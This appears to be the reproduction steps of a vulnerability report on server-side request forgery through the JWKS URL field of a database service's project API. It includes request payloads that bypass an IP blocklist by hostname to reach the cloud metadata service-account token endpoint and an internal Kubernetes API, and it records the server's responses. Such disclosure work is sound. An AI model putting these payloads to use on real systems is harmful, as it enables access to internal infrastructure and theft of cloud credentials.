Steps to Reproduce:

Step 1 — Confirm OOB callback (server makes outbound requests):
POST /api/v2/projects/{project_id}/jwks HTTP/2
Host: console.neon.tech
Authorization: Bearer <api_key>
Content-Type: application/json

```{"jwks_url":"https://webhook.site/<id>/.well-known/jwks.json","provider_name":"ssrf-test","jwt_audience":"test"}```

Result: {"message":"invalid JWKS"} — server fetched the URL. Webhook.site received an incoming GET request from Neon's server IP confirming
outbound request was made.

Step 2 — Confirm IP blocklist (direct IP is blocked):
```{"jwks_url":"https://169.254.169.254/latest/meta-data/","provider_name":"ssrf-test","jwt_audience":"test"}```

Result: {"message":"invalid JWKS URL"} — blocked immediately, no outbound request.

Step 3 — Bypass blocklist using hostname:
```{"jwks_url":"https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token","provider_name":"ssrf-test","jwt_aud
ience":"test"}```

Result: {"message":"error fetching the provided JWKS URL"} — server attempted connection to internal metadata service. Different error message
and ~500ms delay confirms real connection attempt vs instant block.

Step 4 — Internal Kubernetes API reachable:
```{"jwks_url":"https://kubernetes.default.svc/.well-known/jwks.json","provider_name":"ssrf-test","jwt_audience":"test"}```

Result: error fetching the provided JWKS URL — Kubernetes API server is reachable from the application server.